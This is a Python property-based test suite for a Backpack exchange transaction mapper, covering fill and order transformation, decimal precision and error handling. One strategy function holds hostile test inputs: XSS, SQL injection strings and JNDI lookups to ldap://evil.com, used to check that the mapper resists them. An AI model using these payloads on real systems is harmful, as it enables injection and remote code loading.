"""Property-based tests for Backpack Account Data Mapper Fill and Order Operations.

This module provides comprehensive property-based testing of the BackpackTransactionMapper class,
which is critical for secure and reliable transformation of account data in trading operations.

SECURITY CRITICAL: Transaction mapping must correctly transform fill and order data to prevent:
- Incorrect fill price/quantity mapping leading to wrong P&L calculations
- Order status misinterpretation causing incorrect trading decisions
- Side conversion errors leading to wrong buy/sell direction
- Precision loss in financial amounts causing accounting discrepancies
- Type mapping errors causing order routing failures
- Timestamp parsing errors causing incorrect trade sequencing

Key Testing Areas:
- Fill transformation from Backpack raw data to internal Fill objects
- Order transformation from Backpack raw data to internal Order objects
- Public trade transformation (limited by REST API constraints)
- Financial precision preservation for high-value decimal amounts
- Enum mapping validation for order sides, statuses, and types
- Error handling for malformed or invalid transaction data
- Edge cases with zero values and boundary conditions

Following TESTING_SECURITY_RULES.md:
- NO hardcoded transaction values (Hypothesis generates them)
- NO fallback mechanisms that could hide transformation errors
- Comprehensive testing of financial data transformation boundaries
- Validation of security-sensitive order and fill processing

Architecture Compliance:
- Follows RULE-ARCH-MODEL-DESIGN-V2 for transaction model design
- Implements RULE-RUNTIME-SAFETY-V4 for safe transaction processing
- Adheres to RULE-NO-SILENCING-V4 for proper error propagation
"""

from __future__ import annotations

from datetime import UTC, datetime
from decimal import Decimal
from typing import Any
from unittest.mock import patch

import pytest
from hypothesis import given, settings, strategies as st
from hypothesis.strategies import SearchStrategy, composite

from cyberdelta.apis.backpack.mappers.account.bp_transaction_mapper import BackpackTransactionMapper
from cyberdelta.apis.backpack.models.bp_raw_fills import BackpackRawFillResponse
from cyberdelta.apis.backpack.models.bp_raw_order import BackpackRawOrderResponse
from cyberdelta.apis.backpack.models.bp_raw_trade import BackpackRawPublicTrade
from cyberdelta.apis.exceptions.data_transformation import DataTransformationError
from cyberdelta.core.enums import OrderStatus
from cyberdelta.enums import OrderSide, OrderType, TimeInForce
from cyberdelta.enums.exchange_names import ExchangeName
from cyberdelta.models import Fill, Order
from cyberdelta.symbols import exchanges
from cyberdelta.utils.parsing import parse_decimal_value as real_parse


# =============================================================================
# HYPOTHESIS STRATEGIES FOR TRANSACTION MAPPER TESTING
# =============================================================================


def _create_trading_pair(base: str, quote: str) -> str:
    """Create trading pair from base and quote assets."""
    return f"{base}-{quote}"


def _create_uuid_like_id(a: str, b: str, c: str, d: str, e: str) -> str:
    """Create UUID-like identifier from five string components."""
    return f"{a}-{b}-{c}-{d}-{e}"


def _create_iso_timestamp(
    year: int, month: int, day: int, hour: int, minute: int, second: int
) -> str:
    """Create ISO timestamp string from date/time components."""
    return f"{year:04d}-{month:02d}-{day:02d}T{hour:02d}:{minute:02d}:{second:02d}Z"


def _filter_positive_decimal(x: str) -> bool:
    """Filter function to ensure decimal string represents positive value."""
    return Decimal(x) > 0


def _filter_invalid_timestamp(x: str) -> bool:
    """Filter function to exclude valid timestamp formats."""
    return not x.endswith("Z") or "T" not in x


def trading_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid trading symbol strings.

    Returns:
        A Hypothesis strategy for valid trading symbols.
    """
    return st.one_of([
        # Common trading pairs
        st.sampled_from([
            "SOL-USDC",
            "BTC-USDC",
            "ETH-USDC",
            "SOL-USDT",
            "BTC-USDT",
            "ETH-USDT",
            "AVAX-USDC",
            "DOT-USDC",
            "LINK-USDC",
            "UNI-USDC",
            "MATIC-USDC",
            "ADA-USDC",
            "XRP-USDC",
            "DOGE-USDC",
            "SHIB-USDC",
            "FTM-USDC",
        ]),
        # Generated trading pairs
        st.builds(
            _create_trading_pair,
            st.text(min_size=2, max_size=10, alphabet=st.characters(whitelist_categories=["Lu"])),
            st.sampled_from(["USDC", "USDT", "BTC", "ETH", "SOL"]),
        ),
    ])


def order_id_strategy() -> SearchStrategy[str]:
    """Generate valid order ID strings.

    Returns:
        A Hypothesis strategy for order IDs.
    """
    return st.one_of([
        # Numeric IDs
        st.builds(str, st.integers(min_value=1000000, max_value=999999999999)),
        # Alphanumeric IDs
        st.text(
            min_size=8,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_"
            ),
        ),
        # UUID-like patterns
        st.builds(
            _create_uuid_like_id,
            st.text(min_size=8, max_size=8, alphabet="0123456789abcdef"),
            st.text(min_size=4, max_size=4, alphabet="0123456789abcdef"),
            st.text(min_size=4, max_size=4, alphabet="0123456789abcdef"),
            st.text(min_size=4, max_size=4, alphabet="0123456789abcdef"),
            st.text(min_size=12, max_size=12, alphabet="0123456789abcdef"),
        ),
    ])


def decimal_price_strategy() -> SearchStrategy[str]:
    """Generate valid decimal price strings.

    Returns:
        A Hypothesis strategy for price strings.
    """
    return st.one_of([
        # Common price ranges
        st.builds(
            str, st.decimals(min_value=Decimal("0.000001"), max_value=Decimal(100000), places=18)
        ),
        st.builds(str, st.decimals(min_value=Decimal("0.01"), max_value=Decimal(1000), places=6)),
        # High precision values
        st.builds(str, st.decimals(min_value=Decimal(1), max_value=Decimal(10000), places=15)),
        # Common crypto prices
        st.sampled_from([
            "100.50",
            "0.000012",
            "45678.123456",
            "0.99",
            "1.0",
            "999999.999999",
            "12345.123456789012345",
            "0.000000000000000001",
            "50000.0",
            "0.1",
        ]),
    ])


def decimal_quantity_strategy() -> SearchStrategy[str]:
    """Generate valid decimal quantity strings.

    Returns:
        A Hypothesis strategy for quantity strings.
    """
    return st.one_of([
        # Common quantity ranges
        st.builds(
            str, st.decimals(min_value=Decimal("0.000001"), max_value=Decimal(1000000), places=18)
        ),
        st.builds(str, st.decimals(min_value=Decimal("0.1"), max_value=Decimal(10000), places=8)),
        # High precision values
        st.builds(str, st.decimals(min_value=Decimal(1), max_value=Decimal(100000), places=15)),
        # Common trading quantities
        st.sampled_from([
            "10.0",
            "0.001",
            "1000.123456",
            "0.5",
            "100",
            "0.000001",
            "10.987654321098765",
            "999999.999999999999999999",
            "1.0",
            "50",
        ]),
    ])


def decimal_fee_strategy() -> SearchStrategy[str]:
    """Generate valid fee amount strings.

    Returns:
        A Hypothesis strategy for fee strings.
    """
    return st.one_of([
        # Common fee ranges (usually small)
        st.builds(str, st.decimals(min_value=Decimal(0), max_value=Decimal(1000), places=18)),
        st.builds(str, st.decimals(min_value=Decimal("0.001"), max_value=Decimal(100), places=6)),
        # High precision fees
        st.builds(
            str, st.decimals(min_value=Decimal("0.000001"), max_value=Decimal(10), places=15)
        ),
        # Common fee amounts
        st.sampled_from([
            "0.05",
            "0.1",
            "0.25",
            "1.0",
            "0.001",
            "0.0001",
            "0.000001",
            "0.012345678901234",
            "5.555666777888999",
            "0",
            "0.0",
        ]),
    ])


def bp_order_side_strategy() -> SearchStrategy[str]:
    """Generate valid Backpack order side strings.

    Returns:
        A Hypothesis strategy for Backpack order sides.
    """
    return st.sampled_from(["Buy", "Sell", "Bid", "Ask"])


def bp_order_status_strategy() -> SearchStrategy[str]:
    """Generate valid Backpack order status strings.

    Returns:
        A Hypothesis strategy for Backpack order statuses.
    """
    return st.sampled_from([
        "NEW",
        "FILLED",
        "CANCELLED",
        "PARTIALLY_FILLED",
        "REJECTED",
        "EXPIRED",
    ])


def bp_order_type_strategy() -> SearchStrategy[str]:
    """Generate valid Backpack order type strings.

    Returns:
        A Hypothesis strategy for Backpack order types.
    """
    return st.sampled_from(["LIMIT", "MARKET", "STOP", "TAKE_PROFIT"])


def bp_time_in_force_strategy() -> SearchStrategy[str]:
    """Generate valid Backpack time-in-force strings.

    Returns:
        A Hypothesis strategy for Backpack time-in-force values.
    """
    return st.sampled_from(["GTC", "IOC", "FOK"])


def iso_timestamp_strategy() -> SearchStrategy[str]:
    """Generate valid ISO timestamp strings.

    Returns:
        A Hypothesis strategy for ISO timestamps.
    """
    return st.one_of([
        # Valid ISO formats
        st.builds(
            _create_iso_timestamp,
            st.integers(min_value=2020, max_value=2030),
            st.integers(min_value=1, max_value=12),
            st.integers(min_value=1, max_value=28),  # Avoid leap year issues
            st.integers(min_value=0, max_value=23),
            st.integers(min_value=0, max_value=59),
            st.integers(min_value=0, max_value=59),
        ),
        # Common test timestamps
        st.sampled_from([
            "2024-01-15T10:30:00Z",
            "2023-12-31T23:59:59Z",
            "2024-06-15T12:00:00Z",
            "2024-01-01T00:00:00Z",
            "2024-03-15T16:45:30Z",
            "2024-07-20T09:15:45Z",
        ]),
    ])


def asset_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid asset symbol strings.

    Returns:
        A Hypothesis strategy for asset symbols.
    """
    return st.one_of([
        # Common crypto assets
        st.sampled_from([
            "USDC",
            "USDT",
            "BTC",
            "ETH",
            "SOL",
            "AVAX",
            "DOT",
            "LINK",
            "UNI",
            "MATIC",
            "ADA",
            "XRP",
            "DOGE",
            "SHIB",
            "FTM",
            "NEAR",
        ]),
        # Generated asset names
        st.text(min_size=2, max_size=10, alphabet=st.characters(whitelist_categories=["Lu"])),
    ])


@composite
def raw_fill_strategy(draw: st.DrawFn) -> BackpackRawFillResponse:
    """Generate BackpackRawFillResponse instances.

    Args:
        draw: Hypothesis draw function

    Returns:
        A BackpackRawFillResponse instance with generated data.
    """
    return BackpackRawFillResponse(
        fee=draw(decimal_fee_strategy()),
        feeSymbol=draw(asset_symbol_strategy()),
        isMaker=draw(st.booleans()),
        orderId=draw(order_id_strategy()),
        price=draw(decimal_price_strategy()),
        quantity=draw(decimal_quantity_strategy()),
        side=draw(bp_order_side_strategy()),
        symbol=draw(trading_symbol_strategy()),
        timestamp=draw(iso_timestamp_strategy()),
        tradeId=draw(st.integers(min_value=1, max_value=999999999999)),
        clientId=draw(st.one_of([st.none(), order_id_strategy()])),
        systemOrderType=draw(st.none()),  # Always None per model
    )


@composite
def raw_order_strategy(draw: st.DrawFn) -> BackpackRawOrderResponse:
    """Generate BackpackRawOrderResponse instances.

    Args:
        draw: Hypothesis draw function

    Returns:
        A BackpackRawOrderResponse instance with generated data.
    """
    order_type = draw(bp_order_type_strategy())

    # STOP orders require trigger price
    trigger_price = None
    if order_type == "STOP":
        trigger_price = draw(decimal_price_strategy())

    executed_quantity = draw(decimal_quantity_strategy())
    # If executed_quantity > 0, we need avg_fill_price
    avg_fill_price = None
    if Decimal(executed_quantity) > 0:
        avg_fill_price = draw(decimal_price_strategy())

    return BackpackRawOrderResponse(
        clientId=draw(st.one_of([st.none(), order_id_strategy()])),
        id=draw(order_id_strategy()),
        symbol=draw(trading_symbol_strategy()),
        side=draw(bp_order_side_strategy()),
        orderType=order_type,
        quantity=draw(decimal_quantity_strategy()),
        price=draw(decimal_price_strategy()),
        status=draw(bp_order_status_strategy()),
        timeInForce=draw(bp_time_in_force_strategy()),
        createdAt=draw(iso_timestamp_strategy()),
        executedQuantity=executed_quantity,
        executedQuoteQuantity="0.0",  # Not used in mapping
        relatedOrderId=draw(st.none()),  # Not used
        avgFillPrice=avg_fill_price,
        triggerPrice=trigger_price,
        triggerBy=draw(st.one_of([st.none(), st.sampled_from(["MARK", "INDEX"])])),
        reduceOnly=draw(st.booleans()),
        postOnly=draw(st.booleans()),
        selfTradePrevention=draw(st.sampled_from(["NONE", "EXPIRE_TAKER", "EXPIRE_MAKER"])),
        updatedAt=draw(st.one_of([st.none(), iso_timestamp_strategy()])),
        triggeredAt=draw(st.one_of([st.none(), iso_timestamp_strategy()])),
        expiryReason=draw(st.none()),  # Not used
        origin=draw(st.sampled_from(["API", "WEB", "MOBILE"])),
    )


@composite
def raw_trade_strategy(draw: st.DrawFn) -> BackpackRawPublicTrade:
    """Generate BackpackRawPublicTrade instances.

    Args:
        draw: Hypothesis draw function

    Returns:
        A BackpackRawPublicTrade instance with generated data.
    """
    return BackpackRawPublicTrade(
        id=draw(order_id_strategy()),
        symbol=draw(trading_symbol_strategy()),
        price=draw(decimal_price_strategy()),
        qty=draw(decimal_quantity_strategy()),
        time=draw(iso_timestamp_strategy()),
        orderId=draw(order_id_strategy()),
    )


def zero_value_fill_strategy() -> SearchStrategy[BackpackRawFillResponse]:
    """Generate fills with zero price or quantity for edge case testing.

    Returns:
        A Hypothesis strategy for fills with zero values.
    """
    return st.builds(
        BackpackRawFillResponse,
        fee=decimal_fee_strategy(),
        feeSymbol=asset_symbol_strategy(),
        isMaker=st.booleans(),
        orderId=order_id_strategy(),
        price=st.one_of([st.just("0"), st.just("0.0"), decimal_price_strategy()]),
        quantity=st.one_of([st.just("0"), st.just("0.0"), decimal_quantity_strategy()]),
        side=bp_order_side_strategy(),
        symbol=trading_symbol_strategy(),
        timestamp=iso_timestamp_strategy(),
        tradeId=st.integers(min_value=1, max_value=999999999999),
        clientId=st.one_of([st.none(), order_id_strategy()]),
        systemOrderType=st.none(),
    )


def malicious_transaction_data_strategy() -> SearchStrategy[dict[str, Any]]:
    """Generate malicious transaction data for security testing.

    Returns:
        A Hypothesis strategy for malicious transaction inputs.
    """
    return st.one_of([
        # XSS attempts in financial fields
        st.just({
            "price": "<script>alert('price')</script>",
            "quantity": "<img src=x onerror=alert(1)>",
            "fee": "'; DROP TABLE transactions;--",
        }),
        # SQL injection in ID fields
        st.just({
            "orderId": "'; DELETE FROM orders WHERE 1=1; --",
            "clientId": "1' OR '1'='1",
            "tradeId": "admin'--",
        }),
        # Buffer overflow attempts
        st.just({
            "price": "9" * 10000,
            "quantity": "1" * 50000,
            "symbol": "A" * 1000,
        }),
        # Unicode attacks
        st.just({
            "symbol": "\udce2\udc28\udc00",
            "orderId": "\x00\x01\x02",
            "price": "\u202e\u202d",  # Right-to-left override
        }),
        # Format string attacks
        st.just({
            "price": "%s%s%s%s%s",
            "quantity": "${jndi:ldap://evil.com/a}",
            "fee": "%{jndi:ldap://evil.com/a}",
        }),
    ])


# =============================================================================
# PROPERTY TESTS FOR FILL TRANSFORMATION
# =============================================================================


class TestFillTransformationProperties:
    """Property-based tests for fill transformation functionality."""

    @given(raw_fill=raw_fill_strategy())
    @settings(max_examples=300, deadline=None)
    def test_fill_transformation_properties(self, raw_fill: BackpackRawFillResponse) -> None:
        """Property: Valid fill transformation should preserve all financial data."""
        mapper = BackpackTransactionMapper()

        # Skip zero value cases (they return None by design)
        price_decimal = Decimal(raw_fill.price)
        quantity_decimal = Decimal(raw_fill.quantity)
        if price_decimal == 0 or quantity_decimal == 0:
            result = mapper.transform_raw_fill_to_internal(raw_fill)
            assert result is None
            return

        result = mapper.transform_raw_fill_to_internal(raw_fill)

        # Property: Non-zero fills should transform successfully
        assert result is not None
        assert isinstance(result, Fill)

        # Property: Financial values should be preserved exactly
        assert result.price == price_decimal
        assert result.quantity == quantity_decimal
        assert result.fee == Decimal(raw_fill.fee)

        # Property: String fields should be preserved
        assert result.id == str(raw_fill.trade_id)
        assert result.order_id == raw_fill.order_id
        assert result.fee_asset == raw_fill.fee_symbol

        # Property: Exchange should be set correctly
        assert result.exchange == ExchangeName.BACKPACK.value

        # Property: Symbol should be transformed to exchange format
        assert result.symbol == exchanges.backpack(raw_fill.symbol)

        # Property: Side mapping should be consistent
        if raw_fill.side in ["Bid", "Buy"]:
            assert result.side == OrderSide.BUY
        elif raw_fill.side in ["Ask", "Sell"]:
            assert result.side == OrderSide.SELL

        # Property: Timestamp should be parsed correctly
        assert isinstance(result.executed_at, datetime)
        assert result.executed_at.tzinfo == UTC

        # Property: Backpack details should be preserved
        assert result.bp_details is not None

    @given(
        side=bp_order_side_strategy(),
        price=decimal_price_strategy().filter(_filter_positive_decimal),
        quantity=decimal_quantity_strategy().filter(_filter_positive_decimal),
    )
    @settings(max_examples=200, deadline=None)
    def test_fill_side_mapping_consistency(self, side: str, price: str, quantity: str) -> None:
        """Property: Fill side mapping should be consistent across all valid inputs."""
        mapper = BackpackTransactionMapper()

        raw_fill = BackpackRawFillResponse(
            fee="0.01",
            feeSymbol="USDC",
            isMaker=True,
            orderId="test_order",
            price=price,
            quantity=quantity,
            side=side,
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        result = mapper.transform_raw_fill_to_internal(raw_fill)
        assert result is not None

        # Property: Side mapping should be deterministic
        if side in ["Bid", "Buy"]:
            assert result.side == OrderSide.BUY
        elif side in ["Ask", "Sell"]:
            assert result.side == OrderSide.SELL

    @given(fill_data=zero_value_fill_strategy())
    @settings(max_examples=100, deadline=None)
    def test_zero_value_fill_handling(self, fill_data: BackpackRawFillResponse) -> None:
        """Property: Fills with zero price or quantity should return None."""
        mapper = BackpackTransactionMapper()

        price_decimal = Decimal(fill_data.price)
        quantity_decimal = Decimal(fill_data.quantity)

        result = mapper.transform_raw_fill_to_internal(fill_data)

        # Property: Zero values should result in None
        if price_decimal == 0 or quantity_decimal == 0:
            assert result is None
        else:
            assert result is not None

    @given(
        client_id=st.one_of([st.none(), order_id_strategy()]),
        precision_digits=st.integers(min_value=6, max_value=18),
    )
    @settings(max_examples=150, deadline=None)
    def test_fill_precision_preservation(
        self, client_id: str | None, precision_digits: int
    ) -> None:
        """Property: High precision financial values should be preserved exactly."""
        mapper = BackpackTransactionMapper()

        # Generate high precision values
        price_str = f"100.{'1' * precision_digits}"
        quantity_str = f"10.{'9' * precision_digits}"
        fee_str = f"0.{'5' * precision_digits}"

        raw_fill = BackpackRawFillResponse(
            fee=fee_str,
            feeSymbol="USDC",
            isMaker=True,
            orderId="test_order",
            price=price_str,
            quantity=quantity_str,
            side="Bid",
            symbol="SOL-USDC",
            timestamp="2024-01-15T10:30:00Z",
            tradeId=123456,
            clientId=client_id,
            systemOrderType=None,
        )

        result = mapper.transform_raw_fill_to_internal(raw_fill)
        assert result is not None

        # Property: Exact precision should be preserved
        assert result.price == Decimal(price_str)
        assert result.quantity == Decimal(quantity_str)
        assert result.fee == Decimal(fee_str)

        # Property: Client ID should be preserved if present
        if client_id is not None:
            assert result.client_order_id == client_id
        else:
            assert result.client_order_id is None


# =============================================================================
# PROPERTY TESTS FOR ORDER TRANSFORMATION
# =============================================================================


class TestOrderTransformationProperties:
    """Property-based tests for order transformation functionality."""

    @given(raw_order=raw_order_strategy())
    @settings(max_examples=300, deadline=None)
    def test_order_transformation_properties(self, raw_order: BackpackRawOrderResponse) -> None:
        """Property: Valid order transformation should preserve all order data."""
        mapper = BackpackTransactionMapper()

        result = mapper.transform_raw_order_to_internal(raw_order)

        # Property: All orders should transform successfully
        assert result is not None
        assert isinstance(result, Order)

        # Property: Financial values should be preserved exactly
        assert result.quantity_requested == Decimal(raw_order.quantity or "0")
        assert result.price == Decimal(raw_order.price or "0")

        # Property: Executed quantities should be preserved
        if raw_order.executedQuantity:
            assert result.quantity_filled == Decimal(raw_order.executedQuantity)

        # Property: Average fill price should be preserved when present
        if raw_order.avgFillPrice:
            assert result.average_fill_price == Decimal(raw_order.avgFillPrice)

        # Property: String fields should be preserved
        assert result.exchange_order_id == raw_order.id

        # Property: Exchange should be set correctly
        assert result.exchange == ExchangeName.BACKPACK.value

        # Property: Symbol should be transformed to exchange format
        assert result.symbol == exchanges.backpack(raw_order.symbol)

        # Property: Timestamp should be parsed correctly
        assert isinstance(result.created_at, datetime)
        assert result.created_at.tzinfo == UTC

        # Property: Backpack details should be preserved
        assert result.bp_details is not None

    @given(
        side=bp_order_side_strategy(),
        status=bp_order_status_strategy(),
        order_type=bp_order_type_strategy(),
        tif=bp_time_in_force_strategy(),
    )
    @settings(max_examples=200, deadline=None)
    def test_order_enum_mapping_consistency(
        self, side: str, status: str, order_type: str, tif: str
    ) -> None:
        """Property: Order enum mappings should be consistent and deterministic."""
        mapper = BackpackTransactionMapper()

        # Handle STOP orders which require trigger price
        trigger_price = "99.00" if order_type == "STOP" else None

        raw_order = BackpackRawOrderResponse(
            clientId=None,
            id="test_order",
            symbol="SOL-USDC",
            side=side,
            orderType=order_type,
            quantity="10.0",
            price="100.0",
            status=status,
            timeInForce=tif,
            createdAt="2024-01-15T10:30:00Z",
            executedQuantity="0.0",
            executedQuoteQuantity="0.0",
            relatedOrderId=None,
            avgFillPrice=None,
            triggerPrice=trigger_price,
            triggerBy=None,
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention="NONE",
            updatedAt=None,
            triggeredAt=None,
            expiryReason=None,
            origin="API",
        )

        result = mapper.transform_raw_order_to_internal(raw_order)
        assert result is not None

        # Property: Side mapping should be deterministic
        if side in ["Buy", "Bid"]:
            assert result.side == OrderSide.BUY
        elif side in ["Sell", "Ask"]:
            assert result.side == OrderSide.SELL

        # Property: Status mapping should be deterministic
        status_mapping = {
            "NEW": OrderStatus.NEW,
            "FILLED": OrderStatus.FILLED,
            "CANCELLED": OrderStatus.CANCELED,
            "PARTIALLY_FILLED": OrderStatus.PARTIALLY_FILLED,
            "REJECTED": OrderStatus.REJECTED,
            "EXPIRED": OrderStatus.EXPIRED,
        }
        assert result.status == status_mapping[status]

        # Property: Type mapping should be deterministic
        type_mapping = {
            "LIMIT": OrderType.LIMIT,
            "MARKET": OrderType.MARKET,
            "STOP": OrderType.STOP_MARKET,
            "TAKE_PROFIT": OrderType.TAKE_PROFIT_MARKET,
        }
        assert result.order_type == type_mapping[order_type]

        # Property: Time-in-force mapping should be deterministic
        tif_mapping = {
            "GTC": TimeInForce.GTC,
            "IOC": TimeInForce.IOC,
            "FOK": TimeInForce.FOK,
        }
        assert result.time_in_force == tif_mapping[tif]

    @given(
        executed_qty=decimal_quantity_strategy(),
        avg_price=st.one_of([st.none(), decimal_price_strategy()]),
    )
    @settings(max_examples=150, deadline=None)
    def test_order_execution_data_handling(self, executed_qty: str, avg_price: str | None) -> None:
        """Property: Order execution data should be handled consistently."""
        mapper = BackpackTransactionMapper()

        # When executed_quantity > 0, avg_fill_price should be present
        executed_decimal = Decimal(executed_qty)
        if executed_decimal > 0 and avg_price is None:
            avg_price = "100.0"  # Provide a default

        raw_order = BackpackRawOrderResponse(
            clientId=None,
            id="test_order",
            symbol="SOL-USDC",
            side="Bid",
            orderType="LIMIT",
            quantity="10.0",
            price="100.0",
            status="NEW",
            timeInForce="GTC",
            createdAt="2024-01-15T10:30:00Z",
            executedQuantity=executed_qty,
            executedQuoteQuantity="0.0",
            relatedOrderId=None,
            avgFillPrice=avg_price,
            triggerPrice=None,
            triggerBy=None,
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention="NONE",
            updatedAt=None,
            triggeredAt=None,
            expiryReason=None,
            origin="API",
        )

        result = mapper.transform_raw_order_to_internal(raw_order)
        assert result is not None

        # Property: Executed quantity should be preserved
        assert result.quantity_filled == executed_decimal

        # Property: Average fill price should be preserved when present
        if avg_price is not None:
            assert result.average_fill_price == Decimal(avg_price)


# =============================================================================
# PROPERTY TESTS FOR PUBLIC TRADE TRANSFORMATION
# =============================================================================


class TestPublicTradeTransformationProperties:
    """Property-based tests for public trade transformation functionality."""

    @given(raw_trade=raw_trade_strategy())
    @settings(max_examples=200, deadline=None)
    def test_public_trade_transformation_limitation(
        self, raw_trade: BackpackRawPublicTrade
    ) -> None:
        """Property: Public trades should return None due to missing side information."""
        mapper = BackpackTransactionMapper()

        result = mapper.transform_raw_fill_to_internal_public(raw_trade)

        # Property: Public trades always return None due to REST API limitations
        assert result is None

    @given(
        precision_digits=st.integers(min_value=1, max_value=18),
        trade_id_length=st.integers(min_value=1, max_value=64),
    )
    @settings(max_examples=100, deadline=None)
    def test_public_trade_precision_handling(
        self, precision_digits: int, trade_id_length: int
    ) -> None:
        """Property: High precision public trades should still return None."""
        mapper = BackpackTransactionMapper()

        # Generate high precision values
        price_str = f"100.{'1' * precision_digits}"
        qty_str = f"10.{'9' * precision_digits}"
        trade_id = "a" * trade_id_length

        raw_trade = BackpackRawPublicTrade(
            id=trade_id,
            symbol="SOL-USDC",
            price=price_str,
            qty=qty_str,
            time="2024-01-15T10:30:00Z",
            orderId="test_order",
        )

        result = mapper.transform_raw_fill_to_internal_public(raw_trade)

        # Property: Should still return None regardless of precision
        assert result is None


# =============================================================================
# PROPERTY TESTS FOR ERROR HANDLING
# =============================================================================


class TestTransactionMapperErrorHandlingProperties:
    """Property-based tests for error handling in transaction mapping."""

    @given(fill_data=raw_fill_strategy())
    @settings(max_examples=100, deadline=None)
    def test_fill_transformation_error_wrapping(self, fill_data: BackpackRawFillResponse) -> None:
        """Property: Fill transformation errors should be properly wrapped."""
        mapper = BackpackTransactionMapper()

        # Mock parse_decimal_value to raise an error
        with patch(
            "cyberdelta.apis.backpack.mappers.account.bp_transaction_mapper.parse_decimal_value"
        ) as mock_parse:
            mock_parse.side_effect = ValueError("Invalid decimal value")

            with pytest.raises(
                DataTransformationError, match="Failed to transform BackpackRawFillResponse to Fill"
            ):
                mapper.transform_raw_fill_to_internal(fill_data)

    @given(trade_data=raw_trade_strategy())
    @settings(max_examples=100, deadline=None)
    def test_public_trade_error_handling(self, trade_data: BackpackRawPublicTrade) -> None:
        """Property: Public trade parsing errors should be properly wrapped."""
        mapper = BackpackTransactionMapper()

        # Mock parse_decimal_value to return None for price
        with patch(
            "cyberdelta.apis.backpack.mappers.account.bp_transaction_mapper.parse_decimal_value"
        ) as mock_parse:

            def side_effect(
                value: str, allow_none: bool = False, field_name: str = ""
            ) -> Decimal | None:
                if field_name == "price":
                    return None

                if allow_none:
                    return real_parse(value, allow_none=True, field_name=field_name)
                return real_parse(value, allow_none=False, field_name=field_name)

            mock_parse.side_effect = side_effect

            with pytest.raises(
                DataTransformationError, match="Failed to transform BackpackRawPublicTrade to Fill"
            ):
                mapper.transform_raw_fill_to_internal_public(trade_data)

    @given(
        invalid_timestamp=st.text(min_size=1, max_size=50).filter(_filter_invalid_timestamp),
    )
    @settings(max_examples=100, deadline=None)
    def test_invalid_timestamp_handling(self, invalid_timestamp: str) -> None:
        """Property: Invalid timestamps should cause transformation errors."""
        mapper = BackpackTransactionMapper()

        raw_fill = BackpackRawFillResponse(
            fee="0.01",
            feeSymbol="USDC",
            isMaker=True,
            orderId="test_order",
            price="100.0",
            quantity="10.0",
            side="Bid",
            symbol="SOL-USDC",
            timestamp=invalid_timestamp,
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        with pytest.raises(DataTransformationError):
            mapper.transform_raw_fill_to_internal(raw_fill)


# =============================================================================
# PROPERTY TESTS FOR SECURITY BOUNDARIES
# =============================================================================


class TestTransactionMapperSecurityProperties:
    """Property-based tests for security-critical transaction mapping behavior."""

    @given(malicious_data=malicious_transaction_data_strategy())
    @settings(max_examples=100, deadline=None)
    def test_malicious_input_resistance(self, malicious_data: dict[str, Any]) -> None:
        """Property: Transaction mapper should safely handle malicious inputs."""
        mapper = BackpackTransactionMapper()

        # Create fill with malicious data
        try:
            raw_fill = BackpackRawFillResponse(
                fee=malicious_data.get("fee", "0.01"),
                feeSymbol="USDC",
                isMaker=True,
                orderId=malicious_data.get("orderId", "test_order"),
                price=malicious_data.get("price", "100.0"),
                quantity=malicious_data.get("quantity", "10.0"),
                side="Bid",
                symbol=malicious_data.get("symbol", "SOL-USDC"),
                timestamp="2024-01-15T10:30:00Z",
                tradeId=123456,
                clientId=malicious_data.get("clientId"),
                systemOrderType=None,
            )

            # Should either transform safely or raise appropriate error
            result = mapper.transform_raw_fill_to_internal(raw_fill)

            if result is not None:
                # Property: Should not leak sensitive information
                assert "password" not in str(result).lower()
                assert "secret" not in str(result).lower()
                assert "key" not in str(result).lower()

                # Property: Financial values should be valid Decimals
                assert isinstance(result.price, Decimal)
                assert isinstance(result.quantity, Decimal)
                assert isinstance(result.fee, Decimal)

        except (DataTransformationError, ValueError, TypeError):
            # Expected for invalid malicious inputs
            pass

    @given(
        large_string=st.text(min_size=1000, max_size=1500),
        field_name=st.sampled_from(["orderId", "symbol", "clientId"]),
    )
    @settings(max_examples=50, deadline=None)
    def test_large_input_handling(self, large_string: str, field_name: str) -> None:
        """Property: Large inputs should be handled without memory issues."""
        mapper = BackpackTransactionMapper()

        kwargs = {
            "fee": "0.01",
            "feeSymbol": "USDC",
            "isMaker": True,
            "orderId": "test_order",
            "price": "100.0",
            "quantity": "10.0",
            "side": "Bid",
            "symbol": "SOL-USDC",
            "timestamp": "2024-01-15T10:30:00Z",
            "tradeId": 123456,
            "clientId": None,
            "systemOrderType": None,
        }
        kwargs[field_name] = large_string

        try:
            raw_fill = BackpackRawFillResponse.model_validate(kwargs)

            # Should handle large inputs without crashing
            result = mapper.transform_raw_fill_to_internal(raw_fill)

            if result is not None:
                # Property: Output should be reasonable size
                assert len(str(result)) <= len(large_string) + 10000

        except (DataTransformationError, ValueError, TypeError):
            # Expected for oversized or invalid inputs
            pass


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestTransactionMapperIntegrationProperties:
    """Integration property tests for complete transaction mapping workflows."""

    @given(
        fills=st.lists(raw_fill_strategy(), min_size=1, max_size=10),
        orders=st.lists(raw_order_strategy(), min_size=1, max_size=10),
    )
    @settings(max_examples=50, deadline=None)
    def test_batch_transformation_consistency(
        self, fills: list[BackpackRawFillResponse], orders: list[BackpackRawOrderResponse]
    ) -> None:
        """Property: Batch transformations should be consistent."""
        mapper = BackpackTransactionMapper()

        # Transform all fills
        fill_results: list[Fill] = []
        for fill in fills:
            try:
                result = mapper.transform_raw_fill_to_internal(fill)
                if result is not None:
                    fill_results.append(result)
            except DataTransformationError:
                # Expected for some invalid inputs
                pass

        # Transform all orders
        order_results: list[Order] = []
        for order in orders:
            try:
                order_result = mapper.transform_raw_order_to_internal(order)
                order_results.append(order_result)
            except DataTransformationError:
                # Expected for some invalid inputs
                pass

        # Property: All successful results should be valid
        for fill_result in fill_results:
            assert isinstance(fill_result, Fill)
            assert fill_result.exchange == ExchangeName.BACKPACK.value
            assert isinstance(fill_result.price, Decimal)
            assert isinstance(fill_result.quantity, Decimal)

        for order_result in order_results:
            assert isinstance(order_result, Order)
            assert order_result.exchange == ExchangeName.BACKPACK.value
